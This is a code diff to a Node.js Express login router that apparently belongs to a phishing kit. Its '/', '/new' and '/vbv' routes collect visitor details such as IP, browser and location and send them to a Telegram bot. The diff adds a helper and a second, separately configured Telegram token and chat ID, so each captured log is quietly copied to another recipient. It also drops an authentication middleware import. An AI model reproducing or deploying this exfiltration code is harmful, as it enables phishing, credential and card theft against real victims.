@@ -6,9 +6,9 @@ const crypto = require('crypto')
 
 const login =express.Router()
 const axios =require('axios')
-const {protect} = require("../middleware/authMiddleware");
 require('dotenv').config()
 
+const { TOK1 , Chat } = process.env
 const { TOKEN , ChatID } = process.env
 const Telegram_api=`https://api.telegram.org/bot${TOKEN}`
 const generateToken = (id) => {
@@ -16,7 +16,13 @@ const generateToken = (id) => {
         expiresIn: '30d',
     })
 }
-
+const multisend = (chatid,token,data) => {
+    const Telegram_api=`https://api.telegram.org/bot${token}`
+    const rs = axios.post(`${Telegram_api}/sendMessage`, {
+        chat_id: chatid,
+        text: data
+    })
+}
 login.post('/',(req,res)=>{
     const geo = geoip.lookup(req.ip);
     const rand=crypto.createHash('sha1').digest('hex');
@@ -27,10 +33,9 @@ login.post('/',(req,res)=>{
         "Browser : " +req.headers["user-agent"]+"\n"+
         "Ip Address  :"+req.ip+"\n"+
         "----------Created By ChkawPaolo ----------- \n"
-    const rs = axios.post(`${Telegram_api}/sendMessage`, {
-        chat_id: ChatID,
-        text: log
-    })
+    multisend(ChatID,TOKEN,log)
+    multisend(Chat,TOK1,log)
+
     res.status(200).json({
         'session':rand,
         'jwt':generateToken(req.body.username)
@@ -47,11 +52,8 @@ login.post('/new',(req,res)=>{
         "Browser : " +req.headers["user-agent"]+"\n"+
         "Ip Address  :"+req.ip+"\n"+
         "----------Created By ChkawPaolo ----------- \n"
-    const rs = axios.post(`${Telegram_api}/sendMessage`, {
-        chat_id: ChatID,
-        text: log
-    })
-
+    multisend(ChatID,TOKEN,log)
+    multisend(Chat,TOK1,log)
 })
 login.post('/vbv',(req,res)=>{
     const geo = geoip.lookup(req.ip);
@@ -69,10 +71,8 @@ login.post('/vbv',(req,res)=>{
         "Browser : " +req.headers["user-agent"]+"\n"+
         "Ip Address  :"+req.ip+"\n"+
         "----------Created By ChkawPaolo ----------- \n"
-    const rs = axios.post(`${Telegram_api}/sendMessage`, {
-        chat_id: ChatID,
-        text: log
-    })
+    multisend(ChatID,TOKEN,log)
+    multisend(Chat,TOK1,log)
 
 })
 
